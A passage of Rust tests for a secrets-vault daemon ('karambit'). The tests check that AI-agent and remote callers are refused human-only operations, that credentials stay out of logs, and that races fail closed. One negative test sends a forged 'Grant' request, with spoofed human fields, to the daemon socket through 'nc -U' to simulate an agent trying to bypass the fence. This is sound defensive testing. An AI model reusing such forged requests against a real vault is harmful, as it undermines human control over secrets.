        store::FAIL_CONFIG_SAVE.with(|h| h.set(true));
        assert!(send(source_add_request()).is_err());
        assert!(store::load_config(&p).unwrap().sources.is_empty());
        assert!(!p.secret("sources/f/cred").unwrap().exists());
        source_approve(&p);
        let added = send(source_add_request()).unwrap();
        assert_eq!(added.as_object().unwrap().len(), 3);
        assert_eq!(&*source_plaintext(&p), b"synthetic-source-input");
        assert!(!std::fs::read_to_string(p.config()).unwrap().contains("synthetic-source-input"));
        let before = store::load_config(&p).unwrap().sources["f"].clone();
        let bytes = std::fs::read(p.secret("sources/f/cred").unwrap()).unwrap();
        assert!(send(source_add_request()).is_err());
        let retarget = || Req::SourceRetarget { name: "f".into(), endpoint: Some("https://new.invalid/".into()),
            credential: Some(SourceCredential(Zeroizing::new("synthetic-replacement".into()))), policy: Some(json!({"allow":true})) };
        source_approve(&p);
        store::FAIL_CONFIG_SAVE.with(|h| h.set(true));
        assert!(send(retarget()).is_err());
        assert_eq!(store::load_config(&p).unwrap().sources["f"], before);
        assert_eq!(std::fs::read(p.secret("sources/f/cred").unwrap()).unwrap(), bytes);
        assert_eq!(&*source_plaintext(&p), b"synthetic-source-input");
        source_approve(&p);
        send(retarget()).unwrap();
        let after = store::load_config(&p).unwrap().sources["f"].clone();
        assert_source_binding_audit(&p, Some(&before), Some(&after));
        match source_retarget_prompt(&before, &after) {
            Prompt::RetargetSource { old_endpoint, new_endpoint, old_kind, new_kind, .. } => {
                assert_eq!(old_endpoint, "https://fake.invalid/");
                assert_eq!(new_endpoint, "https://new.invalid/");
                assert_eq!(old_kind, "fake"); assert_eq!(new_kind, "fake");
            }
            _ => panic!("wrong source prompt"),
        }
        assert_ne!(before.generation, after.generation);
        assert_ne!(before.credential_revision, after.credential_revision);
        assert_eq!(&*source_plaintext(&p), b"synthetic-replacement");
        assert_ne!(std::fs::read(p.secret("sources/f/cred").unwrap()).unwrap(), bytes);
        source_approve(&p);
        send(Req::SourceRetarget { name: "f".into(), endpoint: None, credential: None, policy: Some(json!({"allow":false})) }).unwrap();
        let policy_only = store::load_config(&p).unwrap().sources["f"].clone();
        assert_ne!(policy_only.generation, after.generation);
        assert_eq!(policy_only.credential_revision, after.credential_revision);
        assert_eq!(&*source_plaintext(&p), b"synthetic-replacement");
        source_approve(&p);
        store::FAIL_CONFIG_SAVE.with(|h| h.set(true));
        assert!(send(Req::SourceRemove { name: "f".into() }).is_err());
        assert_eq!(store::load_config(&p).unwrap().sources["f"], policy_only);
        assert_eq!(&*source_plaintext(&p), b"synthetic-replacement");
        source_approve(&p);
        send(Req::SourceRemove { name: "f".into() }).unwrap();
        assert_source_binding_audit(&p, Some(&policy_only), None);
        assert!(store::load_config(&p).unwrap().sources.is_empty());
        assert!(!p.secret("sources/f/cred").unwrap().exists());
        let audit = std::fs::read_to_string(p.audit()).unwrap();
        assert!(!audit.contains("synthetic-source-input"));
        assert!(!audit.contains("synthetic-replacement"));
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        for action in ["daemon-source-add", "daemon-source-retarget", "daemon-source-remove"] {
            assert!(events.iter().any(|e| e["action"] == action && e["phase"] == "intent"));
            assert!(events.iter().any(|e| e["action"] == action && e["phase"] == "outcome"));
        }
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_mutations_require_fresh_auth_for_human_and_undetected_peer() {
        let p = fixture("source-auth");
        let st = source_context();
        for peer in [human_peer(), agent::Peer::default()] {
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| bail!("source auth refused"))));
            assert!(handle_as(&p, &st, peer, source_add_request(), 0, None, Ok).unwrap_err().to_string().contains("source auth refused"));
            assert!(store::load_config(&p).unwrap().sources.is_empty());
            assert!(!p.secret("sources/f/cred").unwrap().exists());
        }
        source_approve(&p);
        handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
        for req in [Req::SourceRemove { name: "f".into() }, Req::SourceRetarget { name: "f".into(), endpoint: None, credential: None, policy: None }] {
            let before = store::load_config(&p).unwrap().sources;
            let bytes = std::fs::read(p.secret("sources/f/cred").unwrap()).unwrap();
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| bail!("source auth refused"))));
            assert!(handle_as(&p, &st, agent::Peer::default(), req, 0, None, Ok).is_err());
            assert_eq!(store::load_config(&p).unwrap().sources, before);
            assert_eq!(std::fs::read(p.secret("sources/f/cred").unwrap()).unwrap(), bytes);
        }
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("agent reached auth"))));
        assert!(handle_as(&p, &st, agent_peer(), source_add_request(), 0, None, Ok).is_err());
        assert!(helper::AUTH_HOOK.with(|h| h.borrow().is_some()));
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_invalid_metadata_refused_before_auth() {
        let p = fixture("source-invalid");
        let st = source_context();
        let calls = forbid_helpers();
        for field in ["name", "kind", "endpoint", "auth_method", "credential", "policy"] {
            let mut req = source_add_request();
            if let Req::SourceAdd { name, kind, endpoint, auth_method, credential, policy } = &mut req {
                match field {
                    "name" => *name = "../bad".into(),
                    "kind" => *kind = "bad\nkind".into(),
                    "endpoint" => *endpoint = format!("https://fake.invalid/{}", "x".repeat(2048)),
                    "auth_method" => *auth_method = "bad\tauth".into(),
                    "credential" => credential.0.clear(),
                    "policy" => *policy = json!({"number":1.5}),
                    _ => unreachable!(),
                }
            }
            assert!(handle_as(&p, &st, human_peer(), req, 0, None, Ok).is_err());
        }
        assert_eq!(calls.get(), 0);
        assert!(store::load_config(&p).unwrap().sources.is_empty());
        assert!(!p.secret("sources/f/cred").unwrap().exists());
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_intent_failure_and_stale_approval_have_no_effect() {
        let p = fixture("source-intent-cas");
        let st = source_context();
        let calls = forbid_helpers();
        crate::audit::fail_phase(Some("intent"));
        assert!(handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).is_err());
        crate::audit::fail_phase(None);
        assert_eq!(calls.get(), 0);
        assert!(!p.secret("sources/f/cred").unwrap().exists());
        clear_hooks();
        source_approve(&p);
        handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
        let paths = p.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            let mut config = store::load_config(&paths)?;
            config.sources.get_mut("f").unwrap().generation = "a".repeat(32);
            store::save_config(&paths, &config)?;
            Ok(())
        })));
        assert!(handle_as(&p, &st, human_peer(), Req::SourceRemove { name: "f".into() }, 0, None, Ok)
            .unwrap_err().to_string().contains("changed during approval"));
        assert!(store::load_config(&p).unwrap().sources.contains_key("f"));
        assert_eq!(&*source_plaintext(&p), b"synthetic-source-input");
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_list_is_value_free_and_needs_no_helper() {
        let p = fixture("source-list");
        let st = source_context();
        let calls = forbid_helpers();
        let mut config = store::load_config(&p).unwrap();
        let source = crate::backend::SourceConfig {
            name: "f".into(), kind: "fake".into(), endpoint: "https://fake.invalid:443/".into(),
            auth_method: "token".into(), credential_ref: "sources/f/cred".into(),
            credential_revision: "synthetic-revision".into(), generation: "0".repeat(32), policy: json!({}),
        };
        config.sources.insert(source.name.clone(), source.clone());
        store::save_config(&p, &config).unwrap();
        assert_eq!(store::load_config(&p).unwrap().sources["f"], source);
        let result = handle_as(&p, &st, human_peer(), Req::SourceList, 0, None, Ok).unwrap();
        assert_eq!(result, json!({"ok": true, "sources": [{
            "name": "f", "kind": "fake", "endpoint": "https://fake.invalid:443/",
            "auth_method": "token", "generation": "0".repeat(32),
        }]}));
        assert_eq!(calls.get(), 0);
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_credential_debug_redacted_and_generic_mutations_reserved() {
        let request = source_requests().remove(0).1;
        assert!(!format!("{request:?}").contains("synthetic-source-input"));
        let encoded = encode_request(&request, None).unwrap();
        let decoded: Req = serde_json::from_slice(&encoded).unwrap();
        assert!(!format!("{decoded:?}").contains("synthetic-source-input"));
        let p = fixture("source-reserved");
        let st = source_context();
        let v = peer_vault(&p, &human_peer()).unwrap();
        let pk = v.pubkeys_local().unwrap();
        let f = v.build_file("sources/f/cred", Tier::Bio, false, false, &crate::crypto::new_dek(), b"synthetic", &pk, None).unwrap();
        store::save_secret(&p, &f).unwrap();
        let calls = forbid_helpers();
        for req in [
            Req::Unlock { names: vec!["*".into()], action: UnlockAction::Get, context: None, cmd: None, gate_open: false, sso_profile: None, ttl: 0 },
            Req::Copy { name: "sources/f/cred".into() },
            Req::HumanUnlock { names: vec!["sources/f/cred".into()] },
            Req::Unlock { names: vec!["sources/f/cred".into()], action: UnlockAction::Get, context: None, cmd: None, gate_open: false, sso_profile: None, ttl: 0 },
            Req::Add { name: "sources/f/cred".into(), value: B64.encode(b"synthetic"), tier: None, agent_allowed: false, public: false, overwrite: true },
            Req::Delete { patterns: vec!["sources/*".into()] },
            Req::ChangePolicy { patterns: vec!["*".into()], tier: Some(Tier::Open), agent_allowed: Some(true), public: None },
        ] {
            let before = snapshot(&p, &st);
            let error = handle_as(&p, &st, human_peer(), req, 0, None, Ok).unwrap_err();
            assert!(error.to_string().contains("reserved for source management"));
            assert!(snapshot(&p, &st) == before);
        }
        assert_eq!(calls.get(), 0);
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    /// One raw daemon request per fenced daemon verb (several verbs have more than one request).
    fn fenced_requests() -> Vec<(Verb, Req)> {
        let paper = || Zeroizing::new("AGE-SECRET-KEY-SYNTHETIC".to_string());
        let (_, recipient) = crate::crypto::generate_backup_identity();
        vec![
            (Verb::ProfileTrust, Req::ProfileTrust { path: "/synthetic/.karambit.env".into() }),
            (Verb::Kill, Req::Kill { agent: None, session: None, all: true, revive: false }),
            (Verb::Revive, Req::Kill { agent: None, session: None, all: true, revive: true }),
            (Verb::Init, Req::Init { backup_recipient: None }),
            (Verb::Add, Req::Add { name: "test/new".into(), value: B64.encode(b"synthetic"), tier: Some(Tier::Bio), agent_allowed: false, public: false, overwrite: false }),
            (Verb::Add, Req::Add { name: "test/agentok".into(), value: B64.encode(b"synthetic"), tier: Some(Tier::Bio), agent_allowed: false, public: false, overwrite: true }),
            (Verb::Rm, Req::Delete { patterns: vec!["test/bio".into()] }),
            (Verb::PolicyRelax, Req::ChangePolicy { patterns: vec!["test/bio".into()], tier: Some(Tier::Open), agent_allowed: Some(true), public: None }),
            (Verb::ConfigRelax, Req::ChangeConfig { key: "default-tier".into(), value: "off".into() }),
            (Verb::ConfigRelax, Req::ChangeConfig { key: "agent-process-names".into(), value: "".into() }),
            (Verb::LeaseGrant, Req::GrantLease { names: vec!["test/agentok".into()], grantee: Grantee::Any, hours: 1.0, scope: Scope::default() }),
            (Verb::LeaseGrant, Req::Grant { leases: vec![GrantItem { name: "test/bio".into(), dek: B64.encode([1; 32]), to: Grantee::Any, root: None, expires: u64::MAX, scope: Scope::default(), by: "forged".into() }] }),
            (Verb::HumanUnlock, Req::HumanUnlock { names: vec!["test/bio".into()] }),
            (Verb::KeysUpgrade, Req::UpgradeKeys),
            (Verb::HelperPin, Req::HelperPin { stage_daemon: None, stage_helper: None }),
            (Verb::Recover, Req::Recover { identity_text: paper() }),
            (Verb::Recover, Req::RecoverFromPaper { identity_text: paper(), accept_loss: vec![] }),
            (Verb::RetireKeys, Req::RetireKeys),
            (Verb::RetireKeys, Req::RetireKeysWithPaper { identity_text: paper() }),
            (Verb::BackupRotate, Req::RotateBackup { recipient }),
            (Verb::NoRedact, Req::RunUnredacted { command: "/usr/bin/true".into() }),
            (Verb::DaemonStop, Req::Shutdown),
            (Verb::SsoLogin, Req::CompleteSsoLogin { session: session() }),
            (Verb::SsoLogin, Req::SsoSet { session: session(), profiles: vec![], limit_minutes: None }),
            (Verb::SsoLogout, Req::SsoLogout { portal: None }),
            (Verb::SsoPortalAdd, Req::SsoPortalAdd { name: "new".into(), start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into() }),
            (Verb::SsoPortalLimit, Req::SsoPortalLimit { portal: "main".into(), minutes: Some(60) }),
            (Verb::SsoPortalLimit, Req::SsoLimit { portal: "main".into(), minutes: Some(60) }),
            (Verb::SsoRegister, Req::RefreshSsoRegistrations { names: vec!["aws/x".into()] }),
            (Verb::SsoRegister, Req::SsoRegister { profiles: vec![] }),
            (Verb::SsoDiscover, Req::SsoDiscover { portal: "main".into() }),
            (Verb::SsoDiscover, Req::SsoImportPreview { portal: "main".into(), roles: vec![] }),
            (Verb::SsoImport, Req::SsoImport { portal: "main".into(), items: vec![], tier: Tier::Bio, agent_allowed: false, region: None }),
        ].into_iter().chain(source_requests()).collect()
    }

    /// Every file under the vault except the audit chain and run dir, plus State sizes.
    fn snapshot(p: &Paths, st: &Mutex<State>) -> (Vec<(PathBuf, Vec<u8>)>, [usize; 5]) {
        let mut files = vec![];
        let mut stack = vec![p.root.clone()];
        while let Some(dir) = stack.pop() {
            for e in std::fs::read_dir(&dir).unwrap() {
                let path = e.unwrap().path();
                let name = path.file_name().unwrap().to_string_lossy().into_owned();
                if path.is_dir() {
                    if name != "run" { stack.push(path); }
                } else if !name.starts_with("audit") {
                    files.push((path.clone(), std::fs::read(&path).unwrap()));
                }
            }
        }
        files.sort();
        let g = st.lock().unwrap();
        (files, [g.leases.len(), g.human.len(), g.aws.len(), g.sso.len(), g.sso_profiles.len()])
    }

    #[test]
    fn table_covers_every_fenced_daemon_verb_with_a_raw_request() {
        let covered: Vec<Verb> = fenced_requests().iter().map(|(verb, _)| *verb).collect();
        for row in fence::AGENT_DENIED_VERBS {
            assert_eq!(row.daemon, covered.contains(&row.verb), "{:?}: daemon row and raw request table disagree", row.verb);
        }
        for (verb, req) in fenced_requests() {
            // Policy and config requests are conditional: the operation does the lookup.
            let categorical = !matches!(verb, Verb::PolicyRelax | Verb::ConfigRelax);
            assert_eq!(fence::request_verb(&req), categorical.then_some(verb), "{verb:?}");
        }
    }

    /// Negative test: a raw daemon-socket `Grant` from a kernel-observed agent is refused by
    /// the fence (not merely by Grant's own DEK refusal), through serve_connection and
    /// LOCAL_PEERTOKEN, with forged human wire fields and no authority change.
    #[test]
    fn raw_socket_grant_from_agent_peer_is_fenced() {
        let p = fixture("fence-socket-grant");
        let mut cfg = store::load_config(&p).unwrap();
        let me = agent::proc_exe(std::process::id() as i32).unwrap();
        let exe_name = Path::new(&me).file_name().unwrap().to_str().unwrap().to_owned();
        cfg.agent_process_names.push(exe_name.clone());
        store::save_config(&p, &cfg).unwrap();
        let calls = forbid_helpers();
        store::ensure_dir(&run_dir(&p)).unwrap();
        let listener = UnixListener::bind(sock_path(&p)).unwrap();
        let st = Arc::new(source_context());
        let (paths, state) = (p.clone(), st.clone());
        let server = std::thread::spawn(move || {
            let (c, _) = listener.accept().unwrap();
            serve_connection(paths, state, c, unsafe { libc::getuid() }, 0);
        });
        let before = snapshot(&p, &st);
        // The socket peer is /usr/bin/nc, a child of /bin/sh, a child of this test binary.
        // Agent classification therefore comes only from the kernel-observed ancestry
        // (the test binary's name is configured as an agent above), with a scrubbed
        // environment so no env marker contributes. Wire fields claim a human grantor.
        let raw = Req::Grant { leases: vec![GrantItem { name: "test/bio".into(), dek: B64.encode([1; 32]),
            to: Grantee::Human, root: None, expires: u64::MAX, scope: Scope::default(), by: "human".into() }] };
        let frame = std::env::temp_dir().join(format!("karambit-grant-frame-{}", std::process::id()));
        std::fs::write(&frame, &*encode_request(&raw, None).unwrap()).unwrap();
        let output = std::process::Command::new("/bin/sh")
            .arg("-c").arg(r#"/usr/bin/nc -U "$0" < "$1""#).arg(sock_path(&p)).arg(&frame)
            .env_clear().env("PATH", "/usr/bin:/bin").output().unwrap();
        server.join().unwrap();
        let out = String::from_utf8(output.stdout).unwrap();
        let v: Value = serde_json::from_str(out.trim()).unwrap();
        let what = fence::AGENT_DENIED_VERBS.iter().find(|r| r.verb == Verb::LeaseGrant).unwrap().what;
        let err = v["error"].as_str().unwrap_or_default();
        assert!(err.starts_with(&format!("{what} is human-only; refused because caller chain includes agent (")), "{v}");
        assert!(!err.contains("client-supplied DEKs"), "refused by Grant's own check, not the fence: {v}");
        assert_eq!(calls.get(), 0);
        assert!(snapshot(&p, &st) == before, "agent socket Grant changed vault, config or daemon state");
        assert!(st.lock().unwrap().leases.is_empty());
        std::fs::remove_file(&frame).unwrap();
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn raw_agent_request_for_every_fenced_daemon_verb_is_refused_without_effect() {
        let p = fixture("fence-agent");
        let calls = forbid_helpers();
        let st = source_context();
        for (verb, req) in fenced_requests() {
            let what = fence::AGENT_DENIED_VERBS.iter().find(|r| r.verb == verb).unwrap().what;
            // SsoPortalLimit/SsoLimit have no dispatch-level audit action (the limit operation audits its own commits).
            let expect_audit = !matches!(req, Req::SsoPortalLimit { .. } | Req::SsoLimit { .. } | Req::SourceList);
            let before = snapshot(&p, &st);
            let events_before = crate::audit::read(&p, usize::MAX).unwrap().len();
            let label = format!("{req:?}").chars().take(40).collect::<String>();
            let error = handle_as(&p, &st, agent_peer(), req, 0, None, Ok).unwrap_err();
            assert_eq!(error.to_string(), fence::refusal(what, "synthetic"), "{verb:?} {label}");
            assert_eq!(calls.get(), 0, "{verb:?} {label} reached a helper seam");
            assert!(snapshot(&p, &st) == before, "{verb:?} {label} changed vault, config or daemon state");
            let events = crate::audit::read(&p, usize::MAX).unwrap();
            let new = &events[events_before..];
            assert!(new.iter().all(|e| e.get("ok") != Some(&json!(true)) || e["phase"] == "intent"), "{verb:?} {label} audited a success");
            if expect_audit {
                assert!(new.iter().any(|e| e["ok"] == json!(false) && e["err"] == json!(fence::refusal(what, "synthetic"))), "{verb:?} {label} refusal not audited");
            }
        }
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    fn remote_peer(allowed: bool) -> agent::Peer {
        agent::Peer { pid: std::process::id() as i32, caller: agent::Caller { remote: true, remote_allowed: allowed, ..Default::default() }, ..Default::default() }
    }

    /// `ssh localhost karambit ...` has no agent in its chain, but it is remote.
    /// Every fenced daemon verb refuses it before any helper seam or effect, and the
    /// audit row records the caller as remote.
    #[test]
    fn raw_remote_request_for_every_fenced_daemon_verb_is_refused_without_effect() {
        let p = fixture("fence-remote");
        let calls = forbid_helpers();
        let st = source_context();
        for (verb, req) in fenced_requests() {
            let what = fence::AGENT_DENIED_VERBS.iter().find(|r| r.verb == verb).unwrap().what;
            let expect_audit = !matches!(req, Req::SsoPortalLimit { .. } | Req::SsoLimit { .. } | Req::SourceList);
            let before = snapshot(&p, &st);
            let events_before = crate::audit::read(&p, usize::MAX).unwrap().len();
            let label = format!("{req:?}").chars().take(40).collect::<String>();
            let error = handle_as(&p, &st, remote_peer(false), req, 0, None, Ok).unwrap_err();
            assert_eq!(error.to_string(), fence::remote_refusal(what), "{verb:?} {label}");
            assert_eq!(calls.get(), 0, "{verb:?} {label} reached a helper seam");
            assert!(snapshot(&p, &st) == before, "{verb:?} {label} changed vault, config or daemon state");
            let events = crate::audit::read(&p, usize::MAX).unwrap();
            let new = &events[events_before..];
            if expect_audit {
                assert!(new.iter().any(|e| e["ok"] == json!(false) && e["remote"] == json!(true)), "{verb:?} {label} refusal not audited as remote");
            }
        }
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn remote_request_passes_the_fence_when_allow_ssh_human_is_on() {
        let p = fixture("fence-remote-allowed");
        let _calls = forbid_helpers();
        let st = source_context();
        for (verb, req) in fenced_requests() {
            if matches!(verb, Verb::DaemonStop | Verb::HelperPin) { continue; }
            if let Err(error) = handle_as(&p, &st, remote_peer(true), req, 0, None, Ok) {
                assert!(!error.to_string().contains("arrived over SSH"), "{verb:?}: {error:#}");
            }
        }
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    /// Turning allow_ssh_human on relaxes, so a remote caller can't do it even when it is
    /// already allowed to (the toggle itself needs a local human), and turning it off works.
    #[test]
    fn allow_ssh_human_is_relaxing_and_refused_from_a_remote_caller() {
        let p = fixture("allow-ssh-human");
        let calls = forbid_helpers();
        let st = source_context();
        let on = || Req::ChangeConfig { key: "allow-ssh-human".into(), value: "on".into() };
        let err = handle_as(&p, &st, remote_peer(false), on(), 0, None, Ok).unwrap_err();
        assert!(err.to_string().contains("arrived over SSH"), "{err:#}");
        assert!(!store::load_config(&p).unwrap().allow_ssh_human);
        assert_eq!(calls.get(), 0);
        let err = handle_as(&p, &st, agent_peer(), on(), 0, None, Ok).unwrap_err();
        assert!(err.to_string().contains("human-only"), "{err:#}");
        // A local human may turn it on, but only after Touch ID.
        clear_hooks();
        let prompts = Rc::new(Cell::new(0));
        let c = prompts.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { c.set(c.get() + 1); Ok(()) })));
        handle_as(&p, &st, human_peer(), on(), 0, None, Ok).unwrap();
        assert_eq!(prompts.get(), 1, "turning it on asks for Touch ID");
        assert!(store::load_config(&p).unwrap().allow_ssh_human);
        // Turning it back off tightens: no prompt, and the key leaves config.json.
        handle_as(&p, &st, remote_peer(true), Req::ChangeConfig { key: "allow-ssh-human".into(), value: "off".into() }, 0, None, Ok).unwrap();
        assert_eq!(prompts.get(), 1);
        assert!(!store::load_config(&p).unwrap().allow_ssh_human);
        assert!(!std::fs::read_to_string(p.config()).unwrap().contains("allow_ssh_human"));
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn raw_human_requests_are_not_refused_by_the_fence() {
        let p = fixture("fence-human");
        let _calls = forbid_helpers();
        let st = source_context();
        for (verb, req) in fenced_requests() {
            // Shutdown would exit this process; HelperPin resolves the live vault outside the fixture.
            if matches!(verb, Verb::DaemonStop | Verb::HelperPin) { continue; }
            if let Err(error) = handle_as(&p, &st, human_peer(), req, 0, None, Ok) {
                assert!(!error.to_string().contains("is human-only; refused because caller chain"), "{verb:?}: {error:#}");
            }
        }
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn agent_allowed_workflows_are_not_fenced() {
        use p256::elliptic_curve::sec1::ToEncodedPoint as _;
        let p = fixture("fence-allowed");
        let st = source_context();
        let _ = p256::SecretKey::from_slice(&[7; 32]).unwrap().public_key().to_encoded_point(false);
        for action in [UnlockAction::Run, UnlockAction::Get] {
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
            helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|reqs| {
                let sk = p256::SecretKey::from_slice(&[7; 32]).unwrap();
                reqs.iter().map(|(_, eph)| {
                    let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                    Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                }).collect()
            })));
            let req = Req::Unlock { names: vec!["test/agentok".into()], action, context: None, cmd: None, gate_open: false, sso_profile: None, ttl: 60 };
            let response = handle_as(&p, &st, agent_peer(), req, 0, None, Ok).unwrap();
            assert_eq!(B64.decode(response["values"][0]["value"].as_str().unwrap()).unwrap(), b"synthetic", "{action:?}");
        }
        clear_hooks();
        for req in [Req::List, Req::Ping, Req::StatusSelftest, Req::SsoStatus, Req::Revoke { patterns: vec!["test/*".into()] },
            Req::SsoForget { names: vec![] }, Req::AwsClose { id: "none".into() }] {
            if matches!(req, Req::StatusSelftest) { continue; } // would reach the real helper selftest
            assert_eq!(fence::request_verb(&req), None);
            handle_as(&p, &st, agent_peer(), req, 0, None, Ok).unwrap();
        }
        assert_eq!(fence::request_verb(&Req::StatusSelftest), None);
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn fence_only_adds_categorical_refusals_for_known_requests() {
        let unfenced = [
            Req::Ping, Req::StatusSelftest, Req::PubKeys, Req::List, Req::SsoStatus,
            Req::Use { names: vec![], cmd: None }, Req::Copy { name: "test/x".into() },
            Req::LaunchCancel { id: "x".into() }, Req::LaunchRedaction { id: "x".into() }, Req::LaunchBind { id: "x".into() },
            Req::LaunchRedeem { token: "x".into() }, Req::Revoke { patterns: vec![] }, Req::SsoForget { names: vec![] },
            Req::AwsOpen { profile: "x".into(), creds: "x".into(), ttl: 60 }, Req::AwsClose { id: "x".into() },
            Req::SsoOpen { name: "x".into(), dek: None, ttl: 60 },
            Req::Unlock { names: vec![], action: UnlockAction::Get, context: None, cmd: None, gate_open: true, sso_profile: None, ttl: 60 },
            Req::LaunchPrepare { allow_hosts: vec![], jail: false, refs: vec![], env: Default::default(), target: "/usr/bin/true".into(), argv: vec![], cwd: "/".into(), aws: None, ambient_bytes: 0, no_redact: false },
        ];
        for req in unfenced {
            assert_eq!(fence::request_verb(&req), None, "{req:?}");
            assert!(!matches!(req, Req::Shutdown));
        }
        let _ = Layer::Daemon;
    }
}

#[cfg(test)]
mod command_scope_race_tests {
    use super::*;

    fn fixture(label: &str) -> (Paths, Arc<Ctx>, agent::Peer) {
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-scope-race-{label}-{}", std::process::id())) };
        store::ensure_dir(&p.root).unwrap();
        let st = Arc::new(Ctx::new(State::default()));
        st.lock().unwrap().leases.insert("test/secret".into(), Held {
            info: LeaseInfo { name: "test/secret".into(), to: Grantee::Any, to_label: "any agent".into(), granted: now(), expires: now() + 60, remaining: 60, by: "synthetic".into() },
            dek: crate::crypto::new_dek(), root: None, uses: 0,
            scope: Scope { cmds: vec![CommandBinding::from("/usr/bin/true").pin().unwrap()], ..Default::default() },
        });
        let peer = agent::Peer { caller: agent::Caller { agent: Some("synthetic".into()), ..Default::default() }, ..Default::default() };
        (p, st, peer)
    }

    fn use_lease(p: &Paths, st: &Ctx, peer: agent::Peer) -> Value {
        handle_as(p, st, peer, Req::Use { names: vec!["test/secret".into()], cmd: Some("/usr/bin/true".into()) }, 0, None, Ok).unwrap()
    }

    #[test]
    fn command_scope_change_between_snapshots_fails_closed() {
        for mode in ["remove", "change", "add"] {
            let (p, st, peer) = fixture(mode);
            if mode == "add" { st.lock().unwrap().leases.get_mut("test/secret").unwrap().scope.cmds.clear(); }
            let shared = st.clone();
            let pinned = CommandBinding::from("/usr/bin/true").pin().unwrap();
            let other = CommandBinding::from("/bin/echo").pin().unwrap();
            USE_SCOPE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                let mut state = shared.try_lock().expect("snapshot phase must not hold State");
                let scope = &mut state.leases.get_mut("test/secret").unwrap().scope;
                match mode {
                    "remove" => scope.cmds.clear(),
                    "change" => scope.cmds.push(other),
                    _ => scope.cmds = vec![pinned],
                }
            })));
            let response = use_lease(&p, &st, peer);
            assert!(response["deks"]["test/secret"].is_null());
            assert_eq!(response["denied"]["test/secret"], "lease scope changed; retry");
            assert_eq!(st.lock().unwrap().leases["test/secret"].uses, 0);
            std::fs::remove_dir_all(&p.root).unwrap();
        }
    }

    #[test]
    fn command_scope_revoke_between_snapshots_wins_before_dispense() {
        let (p, st, peer) = fixture("revoke");
        let shared = st.clone();
        let paths = p.clone();
        USE_SCOPE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            assert!(shared.try_lock().is_ok(), "snapshot phase must not hold State");
            handle_as(&paths, &shared, agent::Peer::default(), Req::Revoke { patterns: vec!["*".into()] }, 0, None, Ok).unwrap();
        })));
        let response = use_lease(&p, &st, peer);
        assert!(response["deks"]["test/secret"].is_null());
        assert!(st.lock().unwrap().leases.is_empty());
        std::fs::remove_dir_all(&p.root).unwrap();
    }
}

#[cfg(test)]
mod launch_prepare_tests {
    use super::*;
    use std::cell::Cell;
    use std::rc::Rc;

    /// Upper bound for tests that wait on a spawned process or thread to reach a state.
    /// Generous on purpose: a loaded parallel suite is slow, so these waits fail only
    /// on a real hang; each wait polls the awaited condition, never a fixed delay.
    const WAIT: Duration = Duration::from_secs(60);

    struct Fixture { p: Paths, st: Arc<Ctx>, peer: agent::Peer, http_port: u16, sso_base: Option<String> }

    fn set_policy(f: &Fixture, rules: Value, tags: Value) {
        let mut cfg = store::load_config(&f.p).unwrap();
        cfg.policy = Some(serde_json::from_value(json!({"rules": rules, "tags": tags})).unwrap());
        store::save_config(&f.p, &cfg).unwrap();
    }

    #[test]
    fn env_schema_profile_is_pinned_like_karambit_env() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let f = Fixture::new();
        let path = f.p.root.join(".env.schema");
        std::fs::write(&path, "# @sensitive\nA=karambit(test/ref)\nPORT=3000\n").unwrap();
        let path = path.to_str().unwrap().to_owned();
        let human = agent::Peer { pid: f.peer.pid, caller: Default::default(), ..Default::default() };
        let read = || Req::ProfileRead { path: path.clone() };
        assert_eq!(f.send(read()).unwrap_err().to_string(), "profile.untrusted", "agents refused before trust");
        let count = Arc::new(AtomicUsize::new(0));
        let calls = count.clone();
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { calls.fetch_add(1, Ordering::SeqCst); Ok(()) })));
        handle_as(&f.p, &f.st, human, Req::ProfileTrust { path: path.clone() }, 0, None, Ok).unwrap();
        assert_eq!(count.load(Ordering::SeqCst), 1);
        let got = f.send(read()).unwrap();
        assert_eq!(got["specs"], json!([["A", "test/ref"]]), "only karambit() refs reach the daemon");
        assert!(got["schema_text"].as_str().unwrap().contains("PORT=3000"), "plain values come from the pinned bytes");
        std::fs::write(&path, "A=karambit(test/other)\n").unwrap();
        assert_eq!(f.send(read()).unwrap_err().to_string(), "profile.untrusted", "edited schema refused for agents");
